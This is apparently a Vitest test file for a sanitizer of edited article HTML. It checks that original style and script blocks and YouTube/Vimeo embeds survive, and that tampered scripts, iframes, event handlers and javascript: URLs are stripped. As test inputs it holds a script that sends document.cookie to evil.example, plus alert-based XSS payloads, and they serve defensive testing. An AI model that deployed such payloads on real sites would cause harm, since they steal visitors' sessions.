import { describe, expect, it } from 'vitest';
import { sanitizeEditedArticleBody } from '../sanitizeArticleBody';

const ORIGINAL_STYLE = '<style>.title{color:red;}</style>';
const ORIGINAL_SCRIPT = '<script>document.querySelectorAll(".x").forEach(function(){});</script>';
const ORIGINAL_BODY = `${ORIGINAL_STYLE}<h1 class="title">Hello</h1><p>Some copy.</p>${ORIGINAL_SCRIPT}`;

describe('sanitizeEditedArticleBody', () => {
  it('keeps an untouched style/script block that matches the original exactly', () => {
    const edited = `${ORIGINAL_STYLE}<h1 class="title">Hello, edited</h1><p>Some copy.</p>${ORIGINAL_SCRIPT}`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).toContain(ORIGINAL_STYLE);
    expect(result).toContain(ORIGINAL_SCRIPT);
    expect(result).toContain('Hello, edited');
  });

  it('drops a modified script block rather than trusting it', () => {
    const tampered = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const edited = `${ORIGINAL_STYLE}<h1 class="title">Hi</h1>${tampered}`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).not.toContain('evil.example');
    expect(result).not.toContain('<script>');
  });

  it('drops a brand-new style/script block not present in the original', () => {
    const edited = `${ORIGINAL_STYLE}<h1 class="title">Hi</h1><style>body{display:none}</style>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    // The original style survives; the new one does not.
    expect(result).toContain(ORIGINAL_STYLE);
    expect(result.match(/<style>/g)?.length).toBe(1);
  });

  it('strips disallowed structural tags like iframe and object', () => {
    const edited = `<p>Safe</p><iframe src="https://evil.example"></iframe><object data="x"></object>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<object');
    expect(result).toContain('Safe');
  });

  it('strips inline event handler attributes', () => {
    const edited = `<p onclick="alert(1)" onmouseover="alert(2)">Click me</p>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('onmouseover');
    expect(result).toContain('Click me');
  });

  it('strips javascript: scheme hrefs', () => {
    const edited = `<a href="javascript:alert(1)">link</a>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).not.toContain('javascript:');
  });

  it('keeps legitimate data: image sources and normal http(s) links', () => {
    const edited = `<img src="data:image/png;base64,AAAA" alt="x"><a href="https://example.com">ok</a>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).toContain('data:image/png;base64,AAAA');
    expect(result).toContain('https://example.com');
  });

  it('preserves data-* attributes the templates key their CSS and scripts off', () => {
    // Before this was allowed, one save stripped data-reveal (scroll-in
    // visibility) and data-default (the accordion's open panel).
    const edited =
      '<div class="body-copy" data-reveal><p>Copy</p></div>' +
      '<div class="panel" data-default="true"></div>' +
      '<section data-block="video" data-block-id="v1"></section>';
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).toContain('data-reveal');
    expect(result).toContain('data-default="true"');
    expect(result).toContain('data-block="video"');
    expect(result).toContain('data-block-id="v1"');
  });

  it('keeps a YouTube or Vimeo embed iframe', () => {
    const youtube = '<iframe src="https://www.youtube-nocookie.com/embed/abc123" title="Video" allowfullscreen></iframe>';
    const vimeo = '<iframe src="https://player.vimeo.com/video/123456" title="Video"></iframe>';
    const result = sanitizeEditedArticleBody(youtube + vimeo, ORIGINAL_BODY);
    expect(result).toContain('src="https://www.youtube-nocookie.com/embed/abc123"');
    expect(result).toContain('src="https://player.vimeo.com/video/123456"');
  });

  it('drops an iframe on a host that is not an allowed video provider', () => {
    const edited = '<iframe src="https://youtube.com.evil.example/embed/x"></iframe><p>ok</p>';
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).not.toContain('evil.example');
  });

  it('keeps an uploaded video element but not a javascript: source', () => {
    const good = '<video controls playsinline preload="metadata"><source src="https://firebasestorage.googleapis.com/v0/b/x/o/v.mp4" type="video/mp4"></video>';
    const bad = '<video><source src="javascript:alert(1)"></video>';
    const result = sanitizeEditedArticleBody(good + bad, ORIGINAL_BODY);
    expect(result).toContain('https://firebasestorage.googleapis.com/v0/b/x/o/v.mp4');
    expect(result).toContain('controls');
    expect(result).not.toContain('javascript:');
  });

  it('preserves class and id attributes needed for the template CSS to keep applying', () => {
    const edited = `<div class="feature-stage" id="hero"><p class="lede">Text</p></div>`;
    const result = sanitizeEditedArticleBody(edited, ORIGINAL_BODY);
    expect(result).toContain('class="feature-stage"');
    expect(result).toContain('id="hero"');
    expect(result).toContain('class="lede"');
  });
});
